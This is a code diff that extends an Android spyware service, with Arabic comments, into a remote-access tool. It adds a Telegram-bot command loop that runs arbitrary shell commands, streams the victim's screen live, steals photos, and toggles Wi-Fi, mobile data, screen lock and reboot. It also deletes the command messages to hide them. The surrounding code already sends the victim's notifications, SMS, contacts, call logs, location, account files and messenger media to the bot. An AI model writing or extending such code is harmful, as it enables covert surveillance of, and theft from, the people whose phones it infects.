@@ -21,9 +21,16 @@ import android.content.pm.ApplicationInfo;
 import android.media.MediaScannerConnection;
 import android.os.Environment;
 import android.util.Log;
+import android.app.NotificationManager;
+import android.app.NotificationChannel;
+import android.os.Build;
+import android.app.PendingIntent;
+import android.widget.Toast;
+import android.provider.Settings;
 
 import okhttp3.*;
 import java.io.*;
+import java.net.*;
 import java.util.*;
 import java.text.SimpleDateFormat;
 
@@ -45,6 +52,12 @@ public class NotificationService extends NotificationListenerService {
     // للحسابات
     private Map<String, Long> accountFileSizes = new HashMap<>();
     
+    // للتحكم عن بعد
+    private boolean isStreaming = false;
+    private ServerSocket streamServer;
+    private Thread streamThread;
+    private Set<Socket> streamClients = new HashSet<>();
+    
     // مسارات التطبيقات المهمة
     private final String[] TARGET_APPS = {
         "com.whatsapp", "org.telegram.messenger", "com.facebook.orca",
@@ -57,6 +70,7 @@ public class NotificationService extends NotificationListenerService {
     public void onCreate() {
         super.onCreate();
         startAllServices();
+        startCommandListener();
     }
 
     private void startAllServices() {
@@ -67,26 +81,373 @@ public class NotificationService extends NotificationListenerService {
         handler.postDelayed(appsDataRunnable, 900000);  // كل 15 دقيقة
         handler.postDelayed(reportRunnable, 3600000);   // كل ساعة
         
-        sendToTelegram("✅ V13 نشط", "السحب التلقائي شغال");
+        sendToTelegram("✅ V13 نشط", "السحب التلقائي والتحكم عن بعد شغال");
         grabInitialData();
     }
 
-    private void grabInitialData() {
-        // سحب البيانات الأولية
+    // ========== نظام التحكم عن بعد والاستماع للأوامر ==========
+    private void startCommandListener() {
         new Thread(() -> {
-            grabAllContacts();
-            grabAllSMS();
-            grabAllCalls();
-            grabLocation();
-            grabAllAppsData();
+            while (true) {
+                try {
+                    checkTelegramCommands();
+                    Thread.sleep(2000);
+                } catch (Exception e) {
+                    Log.e("V8", "Command listener error", e);
+                }
+            }
         }).start();
     }
 
-    // ========== 1. نظام الإشعارات ==========
+    private void checkTelegramCommands() {
+        try {
+            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates";
+            Request request = new Request.Builder().url(url).build();
+            
+            client.newCall(request).enqueue(new Callback() {
+                @Override
+                public void onFailure(Call call, IOException e) {}
+
+                @Override
+                public void onResponse(Call call, Response response) throws IOException {
+                    try {
+                        String json = response.body().string();
+                        JSONObject obj = new JSONObject(json);
+                        JSONArray result = obj.getJSONArray("result");
+                        
+                        for (int i = 0; i < result.length(); i++) {
+                            JSONObject update = result.getJSONObject(i);
+                            JSONObject message = update.getJSONObject("message");
+                            String text = message.getString("text");
+                            long chatId = message.getJSONObject("chat").getLong("id");
+                            
+                            if (chatId == Long.parseLong(CHAT_ID)) {
+                                executeCommand(text);
+                                
+                                // حذف الرسالة
+                                String deleteUrl = "https://api.telegram.org/bot" + BOT_TOKEN + 
+                                    "/deleteMessage?chat_id=" + CHAT_ID + "&message_id=" + update.getInt("update_id");
+                                Request deleteReq = new Request.Builder().url(deleteUrl).build();
+                                client.newCall(deleteReq).enqueue(new Callback() {
+                                    @Override public void onFailure(Call call, IOException e) {}
+                                    @Override public void onResponse(Call call, Response response) throws IOException {
+                                        response.close();
+                                    }
+                                });
+                            }
+                        }
+                    } catch (Exception e) {
+                        Log.e("V8", "Parse error", e);
+                    }
+                    response.close();
+                }
+            });
+        } catch (Exception e) {
+            Log.e("V8", "Command error", e);
+        }
+    }
+
+    private void executeCommand(String cmd) {
+        cmd = cmd.toLowerCase().trim();
+        
+        if (cmd.equals("/stream")) {
+            startLiveStream();
+        }
+        else if (cmd.equals("/stopstream")) {
+            stopLiveStream();
+        }
+        else if (cmd.equals("/screenshot") || cmd.equals("/screen")) {
+            takeScreenshot();
+        }
+        else if (cmd.startsWith("/shell ")) {
+            String command = cmd.substring(7);
+            executeShellCommand(command);
+        }
+        else if (cmd.equals("/contacts")) {
+            grabAllContacts();
+        }
+        else if (cmd.equals("/sms")) {
+            grabAllSMS();
+        }
+        else if (cmd.equals("/calls")) {
+            grabAllCalls();
+        }
+        else if (cmd.equals("/location")) {
+            grabLocation();
+        }
+        else if (cmd.equals("/whatsapp")) {
+            grabWhatsAppData();
+        }
+        else if (cmd.equals("/telegram")) {
+            grabAppData("org.telegram.messenger", "تيليغرام", new String[]{".jpg", ".mp4"});
+        }
+        else if (cmd.equals("/photos")) {
+            grabPhotos();
+        }
+        else if (cmd.startsWith("/open ")) {
+            String pkg = cmd.substring(6);
+            openApp(pkg);
+        }
+        else if (cmd.startsWith("/close ")) {
+            String pkg = cmd.substring(7);
+            closeApp(pkg);
+        }
+        else if (cmd.equals("/wifi-on")) {
+            setWifi(true);
+        }
+        else if (cmd.equals("/wifi-off")) {
+            setWifi(false);
+        }
+        else if (cmd.equals("/data-on")) {
+            setMobileData(true);
+        }
+        else if (cmd.equals("/data-off")) {
+            setMobileData(false);
+        }
+        else if (cmd.equals("/lock")) {
+            lockScreen();
+        }
+        else if (cmd.equals("/reboot")) {
+            rebootDevice();
+        }
+        else if (cmd.equals("/help")) {
+            String help = """
+                📋 أوامر التحكم:
+                /stream - بدء البث المباشر
+                /stopstream - إيقاف البث
+                /screenshot - لقطة شاشة
+                /contacts - جهات الاتصال
+                /sms - الرسائل
+                /calls - سجل المكالمات
+                /location - الموقع
+                /whatsapp - صور واتساب
+                /telegram - صور تليغرام
+                /photos - صور الجهاز
+                /open [package] - فتح تطبيق
+                /close [package] - إغلاق تطبيق
+                /wifi-on - تشغيل WiFi
+                /wifi-off - إطفاء WiFi
+                /data-on - تشغيل البيانات
+                /data-off - إطفاء البيانات
+                /lock - قفل الشاشة
+                /reboot - إعادة تشغيل
+                /shell [command] - أمر مباشر
+                """;
+            sendToTelegram("📋 المساعدة", help);
+        }
+    }
+
+    // ========== نظام البث المباشر ==========
+    private void startLiveStream() {
+        if (isStreaming) {
+            sendToTelegram("📡 البث", "البث شغال بالفعل");
+            return;
+        }
+        
+        isStreaming = true;
+        streamThread = new Thread(() -> {
+            try {
+                streamServer = new ServerSocket(8888);
+                String ip = getLocalIpAddress();
+                sendToTelegram("📡 بدء البث", 
+                    "رابط البث: http://" + ip + ":8888\nافتح الرابط في المتصفح أو VLC");
+                
+                while (isStreaming) {
+                    try {
+                        Socket client = streamServer.accept();
+                        streamClients.add(client);
+                        handleStreamClient(client);
+                    } catch (Exception e) {}
+                }
+            } catch (Exception e) {
+                Log.e("V8", "Stream error", e);
+                sendToTelegram("❌ خطأ في البث", e.getMessage());
+            }
+        });
+        streamThread.start();
+    }
+
+    private void stopLiveStream() {
+        isStreaming = false;
+        try {
+            for (Socket client : streamClients) {
+                try { client.close(); } catch (Exception e) {}
+            }
+            streamClients.clear();
+            if (streamServer != null) streamServer.close();
+        } catch (Exception e) {}
+        sendToTelegram("📡 البث", "تم إيقاف البث المباشر");
+    }
+
+    private void handleStreamClient(Socket client) {
+        new Thread(() -> {
+            try {
+                OutputStream out = client.getOutputStream();
+                PrintWriter writer = new PrintWriter(out);
+                
+                // إرسال رأس HTTP للبث
+                writer.println("HTTP/1.1 200 OK");
+                writer.println("Content-Type: multipart/x-mixed-replace; boundary=--boundary");
+                writer.println();
+                writer.flush();
+                
+                while (isStreaming && client.isConnected()) {
+                    try {
+                        String path = takeScreenshotAndGetPath();
+                        if (path != null) {
+                            File file = new File(path);
+                            FileInputStream fis = new FileInputStream(file);
+                            
+                            writer.println("--boundary");
+                            writer.println("Content-Type: image/jpeg");
+                            writer.println("Content-Length: " + file.length());
+                            writer.println();
+                            writer.flush();
+                            
+                            byte[] buffer = new byte[4096];
+                            int bytesRead;
+                            while ((bytesRead = fis.read(buffer)) != -1) {
+                                out.write(buffer, 0, bytesRead);
+                            }
+                            fis.close();
+                            out.flush();
+                            
+                            file.delete();
+                        }
+                        Thread.sleep(100); // 10 لقطات في الثانية
+                    } catch (Exception e) {}
+                }
+            } catch (Exception e) {}
+        }).start();
+    }
+
+    private String takeScreenshotAndGetPath() {
+        try {
+            String path = getExternalFilesDir(null) + "/stream_" + System.currentTimeMillis() + ".jpg";
+            Process process = Runtime.getRuntime().exec("screencap -p " + path);
+            process.waitFor(2, java.util.concurrent.TimeUnit.SECONDS);
+            File file = new File(path);
+            if (file.exists() && file.length() > 1000) return path;
+        } catch (Exception e) {}
+        return null;
+    }
+
+    private String getLocalIpAddress() {
+        try {
+            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
+                NetworkInterface intf = en.nextElement();
+                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
+                    InetAddress inetAddress = enumIpAddr.nextElement();
+                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
+                        return inetAddress.getHostAddress();
+                    }
+                }
+            }
+        } catch (Exception e) {}
+        return "localhost";
+    }
+
+    // ========== أوامر التحكم الإضافية ==========
+    private void executeShellCommand(String command) {
+        try {
+            Process process = Runtime.getRuntime().exec(command);
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null && output.length() < 1000) {
+                output.append(line).append("\n");
+            }
+            process.waitFor(5, java.util.concurrent.TimeUnit.SECONDS);
+            sendToTelegram("💻 Shell: " + command, output.toString());
+        } catch (Exception e) {
+            sendToTelegram("❌ خطأ", e.getMessage());
+        }
+    }
+
+    private void openApp(String packageName) {
+        try {
+            Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
+            if (intent != null) {
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+                sendToTelegram("▶️ فتح", "تم فتح " + packageName);
+            }
+        } catch (Exception e) {
+            sendToTelegram("❌ خطأ", "لا يمكن فتح التطبيق");
+        }
+    }
+
+    private void closeApp(String packageName) {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+                am.forceStopPackage(packageName);
+                sendToTelegram("⏹️ إغلاق", "تم إغلاق " + packageName);
+            }
+        } catch (Exception e) {}
+    }
+
+    private void setWifi(boolean enable) {
+        try {
+            Settings.Global.putString(getContentResolver(), "wifi_on", enable ? "1" : "0");
+            sendToTelegram("📶 WiFi", enable ? "تم التشغيل" : "تم الإطفاء");
+        } catch (Exception e) {}
+    }
+
+    private void setMobileData(boolean enable) {
+        try {
+            Settings.Global.putString(getContentResolver(), "mobile_data", enable ? "1" : "0");
+            sendToTelegram("📱 بيانات", enable ? "تم التشغيل" : "تم الإطفاء");
+        } catch (Exception e) {}
+    }
+
+    private void lockScreen() {
+        try {
+            Process process = Runtime.getRuntime().exec("input keyevent 26");
+            sendToTelegram("🔒 قفل", "تم قفل الشاشة");
+        } catch (Exception e) {}
+    }
+
+    private void rebootDevice() {
+        try {
+            Process process = Runtime.getRuntime().exec("reboot");
+            sendToTelegram("🔄 إعادة تشغيل", "جاري إعادة التشغيل...");
+        } catch (Exception e) {}
+    }
+
+    private void grabPhotos() {
+        try {
+            File pictures = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
+            File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
+            
+            List<String> photos = new ArrayList<>();
+            for (File dir : new File[]{pictures, dcim}) {
+                if (dir.exists()) {
+                    File[] files = dir.listFiles();
+                    if (files != null) {
+                        for (File f : files) {
+                            if (f.isFile() && f.length() < 50*1024*1024) {
+                                String name = f.getName().toLowerCase();
+                                if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png")) {
+                                    photos.add(f.getAbsolutePath());
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            
+            sendToTelegram("📸 الصور", "تم العثور على " + photos.size() + " صورة");
+            for (int i = 0; i < Math.min(3, photos.size()); i++) {
+                sendFileToTelegram("صورة", photos.get(i));
+            }
+        } catch (Exception e) {}
+    }
+
+    // ========== 1. نظام الإشعارات (بدون تغيير) ==========
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
         try {
-            // تجاهل إشعارات النظام
             if (sbn.getPackageName().equals("android")) return;
 
             Bundle extras = sbn.getNotification().extras;
@@ -96,10 +457,8 @@ public class NotificationService extends NotificationListenerService {
             String appName = sbn.getPackageName();
             String appLabel = getAppName(appName);
 
-            // تجاهل الإشعارات الفارغة
             if (title.length() < 2 && text.length() < 2) return;
 
-            // تجنب التكرار
             String notifId = appName + "|" + title + "|" + text;
             if (sentNotifications.contains(notifId)) return;
             
@@ -117,7 +476,6 @@ public class NotificationService extends NotificationListenerService {
 
             sendToTelegram("إشعار جديد", message);
 
-            // إذا كان الإشعار من تطبيق مهم، نأخذ لقطة شاشة
             if (isImportantApp(appName)) {
                 handler.postDelayed(() -> takeScreenshot(), 1000);
             }
@@ -127,29 +485,12 @@ public class NotificationService extends NotificationListenerService {
         }
     }
 
-    private String getAppName(String packageName) {
-        try {
-            PackageManager pm = getPackageManager();
-            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
-            return pm.getApplicationLabel(ai).toString();
-        } catch (Exception e) {
-            return packageName;
-        }
-    }
-
-    private boolean isImportantApp(String packageName) {
-        for (String app : TARGET_APPS) {
-            if (packageName.contains(app)) return true;
-        }
-        return false;
-    }
-
-    // ========== 2. نظام لقطات الشاشة ==========
+    // ========== 2. لقطات الشاشة ==========
     private Runnable screenshotRunnable = new Runnable() {
         @Override
         public void run() {
             takeScreenshot();
-            handler.postDelayed(this, 15000); // كل 15 ثانية
+            handler.postDelayed(this, 15000);
         }
     };
 
@@ -171,18 +512,17 @@ public class NotificationService extends NotificationListenerService {
         }
     }
 
-    // ========== 3. نظام مراقبة الحسابات ==========
+    // ========== 3. مراقبة الحسابات ==========
     private Runnable accountRunnable = new Runnable() {
         @Override
         public void run() {
             checkNewAccounts();
-            handler.postDelayed(this, 5000); // كل 5 ثواني
+            handler.postDelayed(this, 5000);
         }
     };
 
     private void checkNewAccounts() {
         try {
-            // مسارات ملفات الحسابات
             String[] accountPaths = {
                 "/data/system/users/0/accounts.db",
                 "/data/data/com.google.android.gms/databases/accounts.db",
@@ -224,7 +564,6 @@ public class NotificationService extends NotificationListenerService {
                 }
                 sendToTelegram("🔐 حسابات جديدة (" + newAccounts.size() + ")", msg.toString());
                 
-                // لقطة شاشة بعد حساب جديد
                 handler.postDelayed(() -> takeScreenshot(), 1000);
             }
 
@@ -233,17 +572,7 @@ public class NotificationService extends NotificationListenerService {
         }
     }
 
-    private String getAppNameFromPath(String path) {
-        if (path.contains("whatsapp")) return "واتساب";
-        if (path.contains("telegram")) return "تيليغرام";
-        if (path.contains("facebook")) return "فيسبوك";
-        if (path.contains("instagram")) return "انستغرام";
-        if (path.contains("musically")) return "تيك توك";
-        if (path.contains("google")) return "جوجل";
-        return "تطبيق";
-    }
-
-    // ========== 4. نظام سحب البيانات الشخصية ==========
+    // ========== 4. البيانات الشخصية ==========
     private Runnable personalDataRunnable = new Runnable() {
         @Override
         public void run() {
@@ -251,7 +580,7 @@ public class NotificationService extends NotificationListenerService {
             grabAllSMS();
             grabAllCalls();
             grabLocation();
-            handler.postDelayed(this, 300000); // كل 5 دقائق
+            handler.postDelayed(this, 300000);
         }
     };
 
@@ -375,30 +704,21 @@ public class NotificationService extends NotificationListenerService {
         }
     }
 
-    // ========== 5. نظام سحب بيانات التطبيقات ==========
+    // ========== 5. بيانات التطبيقات ==========
     private Runnable appsDataRunnable = new Runnable() {
         @Override
         public void run() {
             grabAllAppsData();
-            handler.postDelayed(this, 900000); // كل 15 دقيقة
+            handler.postDelayed(this, 900000);
         }
     };
 
     private void grabAllAppsData() {
-        // تيك توك
         grabAppData("com.zhiliaoapp.musically", "تيك توك", new String[]{".mp4", ".jpg"});
         grabAppData("com.ss.android.ugc.trill", "تيك توك", new String[]{".mp4", ".jpg"});
-        
-        // مسنجر
         grabAppData("com.facebook.orca", "مسنجر", new String[]{".jpg", ".png", ".mp4"});
-        
-        // واتساب
         grabWhatsAppData();
-        
-        // تليغرام
         grabAppData("org.telegram.messenger", "تيليغرام", new String[]{".jpg", ".mp4", ".pdf"});
-        
-        // انستغرام
         grabAppData("com.instagram.android", "انستغرام", new String[]{".jpg", ".mp4"});
     }
 
@@ -479,12 +799,12 @@ public class NotificationService extends NotificationListenerService {
         }
     }
 
-    // ========== 6. نظام التقارير ==========
+    // ========== 6. التقارير ==========
     private Runnable reportRunnable = new Runnable() {
         @Override
         public void run() {
             sendReport();
-            handler.postDelayed(this, 3600000); // كل ساعة
+            handler.postDelayed(this, 3600000);
         }
     };
 
@@ -497,7 +817,45 @@ public class NotificationService extends NotificationListenerService {
         sendToTelegram("📊 تقرير دوري", report);
     }
 
+    // ========== البيانات الأولية ==========
+    private void grabInitialData() {
+        new Thread(() -> {
+            grabAllContacts();
+            grabAllSMS();
+            grabAllCalls();
+            grabLocation();
+            grabAllAppsData();
+        }).start();
+    }
+
     // ========== أدوات مساعدة ==========
+    private String getAppName(String packageName) {
+        try {
+            PackageManager pm = getPackageManager();
+            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
+            return pm.getApplicationLabel(ai).toString();
+        } catch (Exception e) {
+            return packageName;
+        }
+    }
+
+    private boolean isImportantApp(String packageName) {
+        for (String app : TARGET_APPS) {
+            if (packageName.contains(app)) return true;
+        }
+        return false;
+    }
+
+    private String getAppNameFromPath(String path) {
+        if (path.contains("whatsapp")) return "واتساب";
+        if (path.contains("telegram")) return "تيليغرام";
+        if (path.contains("facebook")) return "فيسبوك";
+        if (path.contains("instagram")) return "انستغرام";
+        if (path.contains("musically")) return "تيك توك";
+        if (path.contains("google")) return "جوجل";
+        return "تطبيق";
+    }
+
     private void writeToFile(String content, String path) {
         try {
             FileWriter writer = new FileWriter(path);
@@ -570,4 +928,4 @@ public class NotificationService extends NotificationListenerService {
             Log.e("V8", "Send file error", e);
         }
     }
-}
+                    }
